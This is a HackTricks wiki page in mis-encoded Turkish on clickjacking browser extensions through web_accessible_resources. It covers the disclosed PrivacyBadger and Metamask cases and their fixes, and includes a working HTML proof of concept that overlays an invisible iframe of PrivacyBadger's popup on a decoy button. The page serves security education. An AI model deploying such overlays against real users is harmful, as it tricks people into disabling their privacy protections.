# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Temel Bilgiler

Bu sayfa bir TarayÄ±cÄ± uzantÄ±sÄ±ndaki ClickJacking aÃ§Ä±ÄŸÄ±nÄ± kÃ¶tÃ¼ye kullanacak.\
ClickJacking'in ne olduÄŸunu bilmiyorsanÄ±z kontrol edin:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

UzantÄ±lar **`manifest.json`** dosyasÄ±nÄ± iÃ§erir ve bu JSON dosyasÄ±nda `web_accessible_resources` alanÄ± vardÄ±r. Ä°ÅŸte [Chrome belgelerinin](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) bu konuda sÃ¶yledikleri:

> Bu kaynaklar, **`chrome-extension://[PACKAGE ID]/[PATH]`** URL'si aracÄ±lÄ±ÄŸÄ±yla bir web sayfasÄ±nda mevcut olacaktÄ±r; bu URL, **`extension.getURL method`** ile oluÅŸturulabilir. Beyaz listeye alÄ±nmÄ±ÅŸ kaynaklar uygun CORS baÅŸlÄ±klarÄ± ile sunulur, bu nedenle XHR gibi mekanizmalar aracÄ±lÄ±ÄŸÄ±yla eriÅŸilebilir.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Bir tarayÄ±cÄ± uzantÄ±sÄ±ndaki **`web_accessible_resources`** yalnÄ±zca web Ã¼zerinden eriÅŸilebilir deÄŸildir; aynÄ± zamanda uzantÄ±nÄ±n doÄŸal ayrÄ±calÄ±klarÄ±yla da Ã§alÄ±ÅŸÄ±r. Bu, ÅŸunlarÄ± yapabilme yeteneÄŸine sahip olduklarÄ± anlamÄ±na gelir:

* UzantÄ±nÄ±n durumunu deÄŸiÅŸtirmek
* Ek kaynaklar yÃ¼klemek
* TarayÄ±cÄ± ile belirli bir Ã¶lÃ§Ã¼de etkileÅŸimde bulunmak

Ancak, bu Ã¶zellik bir gÃ¼venlik riski taÅŸÄ±r. EÄŸer **`web_accessible_resources`** iÃ§indeki bir kaynak Ã¶nemli bir iÅŸlevselliÄŸe sahipse, bir saldÄ±rgan bu kaynaÄŸÄ± dÄ±ÅŸ bir web sayfasÄ±na gÃ¶mebilir. Bu sayfayÄ± ziyaret eden dikkatsiz kullanÄ±cÄ±lar, bu gÃ¶mÃ¼lÃ¼ kaynaÄŸÄ± istemeden etkinleÅŸtirebilir. BÃ¶yle bir etkinleÅŸtirme, uzantÄ±nÄ±n kaynaklarÄ±nÄ±n izinlerine ve yeteneklerine baÄŸlÄ± olarak istenmeyen sonuÃ§lara yol aÃ§abilir.

## PrivacyBadger Ã–rneÄŸi

PrivacyBadger uzantÄ±sÄ±nda, `skin/` dizininin aÅŸaÄŸÄ±daki ÅŸekilde `web_accessible_resources` olarak tanÄ±mlanmasÄ±yla ilgili bir aÃ§Ä±k tespit edilmiÅŸtir (Orijinal [blog yazÄ±sÄ±nÄ±](https://blog.lizzie.io/clickjacking-privacy-badger.html) kontrol edin):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Bu yapÄ±landÄ±rma potansiyel bir gÃ¼venlik sorununa yol aÃ§tÄ±. Ã–zellikle, tarayÄ±cÄ±daki PrivacyBadger simgesi ile etkileÅŸimde bulunulduÄŸunda render edilen `skin/popup.html` dosyasÄ±, bir `iframe` iÃ§inde gÃ¶mÃ¼lebilir. Bu gÃ¶mme, kullanÄ±cÄ±larÄ± "Bu Web Sitesi iÃ§in PrivacyBadger'Ä± Devre DÄ±ÅŸÄ± BÄ±rak" butonuna yanlÄ±ÅŸlÄ±kla tÄ±klamaya kandÄ±rmak iÃ§in sÃ¶mÃ¼rÃ¼lebilir. BÃ¶yle bir eylem, PrivacyBadger korumasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakarak kullanÄ±cÄ±nÄ±n gizliliÄŸini tehlikeye atar ve kullanÄ±cÄ±yÄ± artan izlemeye maruz bÄ±rakabilir. Bu istismarÄ±n gÃ¶rsel bir gÃ¶sterimi, [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm) adresinde saÄŸlanan bir ClickJacking video Ã¶rneÄŸinde gÃ¶rÃ¼lebilir.

Bu gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± gidermek iÃ§in basit bir Ã§Ã¶zÃ¼m uygulandÄ±: `/skin/*`'in `web_accessible_resources` listesinden kaldÄ±rÄ±lmasÄ±. Bu deÄŸiÅŸiklik, `skin/` dizininin iÃ§eriÄŸinin web eriÅŸilebilir kaynaklar aracÄ±lÄ±ÄŸÄ±yla eriÅŸilemez veya manipÃ¼le edilemez olmasÄ±nÄ± saÄŸlayarak riski etkili bir ÅŸekilde azalttÄ±.

DÃ¼zeltme kolaydÄ±: **`web_accessible_resources`'dan `/skin/*`'i kaldÄ±rÄ±n**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Metamask Ã–rneÄŸi

A [**ClickJacking ile ilgili bir blog yazÄ±sÄ± burada bulunabilir**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Bu durumda, Metamask, eriÅŸim iÃ§in kullanÄ±lan protokolÃ¼n **`https:`** veya **`http:`** (Ã¶rneÄŸin **`chrome:`** deÄŸil) olduÄŸunu kontrol ederek aÃ§Ä±ÄŸÄ± kapattÄ±:

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Metamask uzantÄ±sÄ±nda dÃ¼zeltildiÄŸi baÅŸka bir ClickJacking**, kullanÄ±cÄ±larÄ±n `â€œweb_accessible_resourcesâ€: [â€œinpage.jsâ€, â€œphishing.htmlâ€]` nedeniyle bir sayfanÄ±n phishing olduÄŸundan ÅŸÃ¼phelenildiÄŸinde **Beyaz Listeye TÄ±klama** yapabilmeleriydi. O sayfa Clickjacking'e karÅŸÄ± savunmasÄ±z olduÄŸundan, bir saldÄ±rgan, kurbanÄ±n fark etmeden beyaz listeye almasÄ± iÃ§in normal bir ÅŸey gÃ¶stererek bunu kÃ¶tÃ¼ye kullanabilir ve ardÄ±ndan beyaz listeye alÄ±nacak phishing sayfasÄ±na geri dÃ¶nebilirdi.

## Steam Envanter YardÄ±mcÄ± ProgramÄ± Ã–rneÄŸi

Bir tarayÄ±cÄ± uzantÄ±sÄ±ndaki **XSS**'nin bir **ClickJacking** aÃ§Ä±ÄŸÄ± ile nasÄ±l zincirleme yapÄ±ldÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± inceleyin:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Referanslar

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
